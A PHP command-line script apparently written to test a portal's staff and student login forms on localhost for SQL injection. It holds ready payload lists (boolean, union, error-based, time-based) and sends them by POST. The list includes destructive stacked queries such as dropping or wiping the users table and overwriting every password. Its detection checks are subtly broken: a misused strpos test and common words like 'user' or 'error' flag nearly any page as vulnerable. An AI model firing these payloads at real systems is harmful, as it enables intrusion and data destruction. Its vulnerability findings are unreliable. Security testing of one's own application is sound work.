<?php
/**
 * SQL Injection Testing Script for WUC Portal Login Forms
 * 
 * This script tests for SQL injection vulnerabilities in the login forms
 * using various payloads and techniques.
 * 
 * WARNING: Use only on systems you own or have explicit permission to test.
 */

// Prevent web access
if (php_sapi_name() !== 'cli') {
    die("This script must be run from command line.\n");
}

echo "=== SQL Injection Testing for ITC Portal Login Forms ===\n\n";

// Test configuration
$config = [
    'staff_login' => 'http://localhost/wucportal/staffLogin.php',
    'student_login' => 'http://localhost/wucportal/studentLogin.php',
    'timeout' => 5
];

// SQL Injection payloads categorized by type
$payloads = [
    'boolean_based' => [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' #",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1--",
        "' OR '1'='1'/*",
        "admin' OR '1'='1",
        "admin' OR 1=1--",
        "admin' OR '1'='1' #"
    ],
    
    'union_based' => [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT database(),NULL,NULL--",
        "' UNION SELECT user(),NULL,NULL--",
        "' UNION SELECT 1,2,3 FROM information_schema.tables--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--"
    ],
    
    'error_based' => [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,@@version,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,user(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ],
    
    'time_based' => [
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
        "' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5(1)))))a)--",
        "' AND (SELECT * FROM (SELECT(BENCHMARK(1000000,MD5(1)))))a)--"
    ],
    
    'stacked_queries' => [
        "'; DROP TABLE users;--",
        "'; DELETE FROM users;--",
        "'; INSERT INTO users VALUES (1,'hacker','hacked');--",
        "'; UPDATE users SET password='hacked';--",
        "'; CREATE TABLE hack (id INT);--",
        "'; SELECT * FROM users;--"
    ]
];

/**
 * Test SQL injection on a specific login form
 */
function test_sql_injection($url, $form_data, $payload, $type) {
    echo "Testing $type payload: " . substr($payload, 0, 40) . "... ";
    
    // Inject payload into user_id field
    $test_data = $form_data;
    if (isset($test_data['user_id'])) {
        $test_data['user_id'] = $payload;
    } elseif (isset($test_data['Sid'])) {
        $test_data['Sid'] = $payload;
    }
    
    $start_time = microtime(true);
    $response = send_request($url, $test_data);
    $response_time = microtime(true) - $start_time;
    
    // Analyze response for vulnerabilities
    $vulnerability_indicators = [
        'sql_error' => ['MySQL', 'SQL', 'database', 'error', 'syntax', 'ORA-', 'SQLite'],
        'time_delay' => $response_time > 3, // More than 3 seconds
        'unexpected_response' => !strpos($response, 'Invalid') && !strpos($response, 'error'),
        'database_info' => ['version', 'database', 'user', 'table', 'column']
    ];
    
    $is_vulnerable = false;
    $vulnerability_type = '';
    
    // Check for SQL errors
    foreach ($vulnerability_indicators['sql_error'] as $indicator) {
        if (stripos($response, $indicator) !== false) {
            $is_vulnerable = true;
            $vulnerability_type = 'SQL Error Disclosure';
            break;
        }
    }
    
    // Check for time-based vulnerabilities
    if ($vulnerability_indicators['time_delay']) {
        $is_vulnerable = true;
        $vulnerability_type = 'Time-based SQL Injection';
    }
    
    // Check for unexpected responses
    if ($vulnerability_indicators['unexpected_response']) {
        $is_vulnerable = true;
            $vulnerability_type = 'Boolean-based SQL Injection';
    }
    
    // Check for database information disclosure
    foreach ($vulnerability_indicators['database_info'] as $info) {
        if (stripos($response, $info) !== false) {
            $is_vulnerable = true;
            $vulnerability_type = 'Information Disclosure';
            break;
        }
    }
    
    if ($is_vulnerable) {
        echo "VULNERABLE ✗ ($vulnerability_type)\n";
        echo "  Response time: " . round($response_time, 2) . "s\n";
        echo "  Response preview: " . substr(strip_tags($response), 0, 100) . "...\n";
        return [
            'payload' => $payload,
            'type' => $type,
            'vulnerability' => $vulnerability_type,
            'response_time' => $response_time,
            'response_preview' => substr(strip_tags($response), 0, 200)
        ];
    } else {
        echo "SAFE ✓\n";
        return [
            'payload' => $payload,
            'type' => $type,
            'vulnerability' => 'NONE',
            'response_time' => $response_time,
            'response_preview' => ''
        ];
    }
}

/**
 * Send HTTP request
 */
function send_request($url, $data) {
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    
    if (curl_error($ch)) {
        $response = "CURL Error: " . curl_error($ch);
    }
    
    curl_close($ch);
    
    return $response;
}

/**
 * Test staff login form
 */
function test_staff_login($config, $payloads) {
    echo "\n=== Testing Staff Login Form ===\n";
    echo "URL: " . $config['staff_login'] . "\n\n";
    
    $staff_form_data = [
        'user_id' => 'test',
        'password' => 'test123',
        'login' => 'submit'
    ];
    
    $results = [];
    
    foreach ($payloads as $category => $category_payloads) {
        echo "--- Testing $category payloads ---\n";
        
        foreach ($category_payloads as $payload) {
            $result = test_sql_injection($config['staff_login'], $staff_form_data, $payload, $category);
            $results[] = $result;
            
            // Small delay between requests
            usleep(200000); // 0.2 seconds
        }
        echo "\n";
    }
    
    return $results;
}

/**
 * Test student login form
 */
function test_student_login($config, $payloads) {
    echo "\n=== Testing Student Login Form ===\n";
    echo "URL: " . $config['student_login'] . "\n\n";
    
    $student_form_data = [
        'Sid' => 'test',
        'Password' => 'test123',
        'login' => 'submit'
    ];
    
    $results = [];
    
    foreach ($payloads as $category => $category_payloads) {
        echo "--- Testing $category payloads ---\n";
        
        foreach ($category_payloads as $payload) {
            $result = test_sql_injection($config['student_login'], $student_form_data, $payload, $category);
            $results[] = $result;
            
            // Small delay between requests
            usleep(200000); // 0.2 seconds
        }
        echo "\n";
    }
    
    return $results;
}

/**
 * Generate detailed report
 */
function generate_sql_injection_report($staff_results, $student_results) {
    echo "\n" . str_repeat("=", 80) . "\n";
    echo "SQL INJECTION VULNERABILITY REPORT\n";
    echo str_repeat("=", 80) . "\n\n";
    
    $total_tests = count($staff_results) + count($student_results);
    $vulnerabilities = 0;
    
    // Count vulnerabilities
    foreach ($staff_results as $result) {
        if ($result['vulnerability'] !== 'NONE') {
            $vulnerabilities++;
        }
    }
    
    foreach ($student_results as $result) {
        if ($result['vulnerability'] !== 'NONE') {
            $vulnerabilities++;
        }
    }
    
    echo "SUMMARY:\n";
    echo "Total SQL Injection Tests: $total_tests\n";
    echo "Vulnerabilities Found: $vulnerabilities\n";
    echo "Security Score: " . round((($total_tests - $vulnerabilities) / $total_tests) * 100, 1) . "%\n\n";
    
    if ($vulnerabilities > 0) {
        echo "🚨 CRITICAL SECURITY VULNERABILITIES DETECTED!\n\n";
        
        echo "VULNERABILITY DETAILS:\n";
        echo str_repeat("-", 50) . "\n";
        
        // Staff vulnerabilities
        $staff_vulns = array_filter($staff_results, function($r) { return $r['vulnerability'] !== 'NONE'; });
        if (!empty($staff_vulns)) {
            echo "\nStaff Login Form Vulnerabilities:\n";
            foreach ($staff_vulns as $vuln) {
                echo "✗ " . $vuln['type'] . ": " . $vuln['vulnerability'] . "\n";
                echo "  Payload: " . $vuln['payload'] . "\n";
                echo "  Response Time: " . $vuln['response_time'] . "s\n";
                if ($vuln['response_preview']) {
                    echo "  Response: " . $vuln['response_preview'] . "\n";
                }
                echo "\n";
            }
        }
        
        // Student vulnerabilities
        $student_vulns = array_filter($student_results, function($r) { return $r['vulnerability'] !== 'NONE'; });
        if (!empty($student_vulns)) {
            echo "\nStudent Login Form Vulnerabilities:\n";
            foreach ($student_vulns as $vuln) {
                echo "✗ " . $vuln['type'] . ": " . $vuln['vulnerability'] . "\n";
                echo "  Payload: " . $vuln['payload'] . "\n";
                echo "  Response Time: " . $vuln['response_time'] . "s\n";
                if ($vuln['response_preview']) {
                    echo "  Response: " . $vuln['response_preview'] . "\n";
                }
                echo "\n";
            }
        }
        
        echo "IMMEDIATE ACTIONS REQUIRED:\n";
        echo "1. Review and fix all identified SQL injection vulnerabilities\n";
        echo "2. Implement proper input validation and sanitization\n";
        echo "3. Use parameterized queries consistently\n";
        echo "4. Add WAF (Web Application Firewall) rules\n";
        echo "5. Conduct security code review\n";
        
    } else {
        echo "✅ No SQL injection vulnerabilities detected!\n";
        echo "The login forms appear to be properly protected against SQL injection attacks.\n";
    }
    
    echo "\n" . str_repeat("=", 80) . "\n";
}

// Run the tests
echo "Starting SQL injection testing...\n\n";

try {
    $staff_results = test_staff_login($config, $payloads);
    $student_results = test_student_login($config, $payloads);
    
    // Generate comprehensive report
    generate_sql_injection_report($staff_results, $student_results);
    
} catch (Exception $e) {
    echo "Error during testing: " . $e->getMessage() . "\n";
}

echo "\nSQL injection testing completed.\n";
?>








